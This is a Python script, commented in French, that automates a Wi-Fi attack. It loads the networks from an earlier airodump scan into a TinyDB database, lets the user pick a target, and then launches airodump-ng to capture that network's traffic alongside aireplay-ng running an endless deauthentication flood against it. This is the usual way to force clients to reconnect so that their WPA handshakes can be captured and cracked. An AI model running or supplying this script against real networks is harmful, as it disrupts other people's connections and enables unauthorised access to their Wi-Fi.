import csv
from tinydb import TinyDB, Query
import os
import subprocess
from multiprocessing import Process

def lancer_airodump_ng(channel, bssid):
    command_airodump = ['x-terminal-emulator', '-e', 'airodump-ng', 'wlan0', '-w', 'captureDatagramme', '-c', channel, '--bssid', bssid]
    subprocess.Popen(command_airodump)

def lancer_aireplay_ng(bssid):
    command_aireplay = ['x-terminal-emulator', '-e', 'aireplay-ng', '-deauth', '0', '-a', bssid, 'wlan0']
    subprocess.Popen(command_aireplay)

# Vérification de l'existence de la base de données
db_file = 'database.json'

if os.path.exists(db_file):
    os.remove(db_file)

# Création d'une nouvelle base de données
db = TinyDB(db_file)

# Lecture du fichier "out-01.csv-01.kismet.csv"
filename = "out-01.csv-01.kismet.csv"

with open(filename, 'r') as file:
    reader = csv.DictReader(file, delimiter=';')
    sequence_number = 1

    for row in reader:
        if row is not None and any(row.values()):
            # Supprimer les espaces supplémentaires dans les clés et les valeurs
            row = {k.strip(): v.strip() for k, v in row.items()}

            # Ajouter le numéro de séquence
            row['Sequence'] = sequence_number

            # Insérer les données dans la base de données
            db.insert(row)

            sequence_number += 1

# Fermeture de la base de données
db.close()

# Supprimer les fichiers
file_list = ['out-01.csv-01.cap', 'out-01.csv-01.csv', 'out-01.csv-01.kismet.netxml', 'out-01.csv-01.log.csv', 'out-01.csv-01.kismet.csv']
for file_name in file_list:
    if os.path.exists(file_name):
        os.remove(file_name)

# Relire la base de données
db = TinyDB(db_file)
table = db.table('_default')

# Récupération de toutes les données de la base de données
data = table.all()

# Trier les données par numéro de séquence
sorted_data = sorted(data, key=lambda x: x['Sequence'])

# Affichage des données en colonnes
print("{:<12s} {:<20s} {:<10s} {:<30s} {:<8s} {:<12s}".format("Num. Seq.", "BSSID", "NetType", "ESSID", "Channel", "Encryption"))
for item in sorted_data:
    print("{:<12d} {:<20s} {:<10s} {:<30s} {:<8s} {:<12s}".format(item['Sequence'], item['BSSID'], item['NetType'], item['ESSID'], item['Channel'], item['Encryption']))

# Demande de saisie du numéro de séquence
print(" ")
sequence_input = input("Veuillez saisir un numéro de séquence : ")

# Recherche et affichage des données correspondantes au numéro de séquence
results = table.search(Query().Sequence == int(sequence_input))
if results:
    print("Données correspondantes :")
    for result in results:
        print(result)

    # Récupération des informations de l'enregistrement choisi
    record = results[0]
    bssid = record['BSSID']
    channel = record['Channel']

    # Lancement des commandes en parallèle
    process_airodump = Process(target=lancer_airodump_ng, args=(channel, bssid))
    process_aireplay = Process(target=lancer_aireplay_ng, args=(bssid,))

    # Démarrage des processus
    process_airodump.start()
    process_aireplay.start()

    # Attendre que les processus se terminent
    process_airodump.join()
    process_aireplay.join()
else:
    print("Aucune donnée correspondante pour le numéro de séquence saisi.")
